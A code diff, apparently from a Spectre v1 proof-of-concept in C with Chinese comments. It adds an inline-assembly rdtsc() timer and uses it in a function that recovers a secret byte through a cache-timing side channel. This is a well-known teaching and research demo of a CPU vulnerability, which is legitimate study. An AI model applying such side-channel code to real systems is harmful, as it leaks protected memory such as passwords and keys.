@@ -27,6 +27,16 @@ void victim_function(size_t x) {
     }
 }
 
+uint64_t rdtsc()
+{
+    uint64_t a, d;
+    __asm__ volatile("mfence");
+    __asm__ volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
+      a = (d << 32) | a;
+    __asm__ volatile("mfence");
+    return a;
+}
+
 /* 读取缓存一个字节
 * 实现通过缓存时序侧信道推测出 secret 字符串中的一个字节
 * 
@@ -83,9 +93,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
             mix_i = ((i * 167) + 13) & 255; //因为 167 与 256 互质，构成模 256 下的乘法置换，加 13 只是平移。能确保全排列
             addr = &array2[mix_i * 512];
 
-            time1 = __rdtscp(&junk);
+            time1 = rdtsc();
             junk = *addr; // 侧信道发生在这
-            time2 = __rdtscp(&junk) - time1;
+            time2 = rdtsc() - time1;
 
             // 避免误报：array1[training_x] 对应的 array2[array1[training_x] * 512] 会被真实访问
             if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
